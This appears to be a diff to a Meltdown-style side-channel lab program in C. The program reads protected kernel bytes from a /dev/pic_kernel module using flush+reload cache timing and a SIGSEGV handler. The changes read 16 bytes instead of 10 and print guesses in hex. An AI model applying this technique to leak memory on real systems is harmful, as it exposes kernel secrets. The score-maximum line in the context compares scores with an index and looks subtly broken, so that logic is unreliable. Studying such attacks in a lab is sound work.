@@ -17,7 +17,7 @@
 #define CACHE_HIT_THRESHOLD 100
 #define DELTA 1024 // to reduce bias toward 0
 #define ITER_N 1000
-#define READ_N 10 // number of kernel bytes to read
+#define READ_N 16 // number of kernel bytes to read
 
 // using the same technique from cache-time.c/flush-reload.c
 uint8_t probe_array[PROBE_N * PAGE_SIZE];
@@ -63,7 +63,7 @@ int main(int argc, char* argv[]) {
 	signal(SIGSEGV, catch_segv);
 
 	// open kernel /proc file
-	int fd = open("/dev/pic_kernel_char", O_RDONLY);
+	int fd = open("/dev/pic_kernel", O_RDONLY);
 	if(fd < 0) {
 		perror("Failed to open /proc file.\n");
 		return -1;
@@ -71,7 +71,7 @@ int main(int argc, char* argv[]) {
 
 	/* Same technique as cache-time.c/flush-reload.c */
 
-	printf("%-12s %-12s %-12s %-12s %-12s\n", "Byte #", "Guess (char)", "Guess (int)", "Hits", "Total Iterations");
+	printf("%-12s %-12s %-12s %-12s\n", "Byte #", "Guess (b)", "Hits", "Total Iterations");
 
 	int c, i, iter;
 	for(c=0; c<READ_N; c++) { // for each char in secret
@@ -117,7 +117,7 @@ int main(int argc, char* argv[]) {
 		for(i=0; i<PROBE_N; i++) {
 			if(scores[i] > max) max = i;
 		}
-		printf("%-12i %-12c %-12i %-12i %-12i\n", c, max, max, scores[max], ITER_N);
+		printf("%-12i %-12x %-12i %-12i\n", c, max, scores[max], ITER_N);
 
 		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
 		addr++; // move to next char
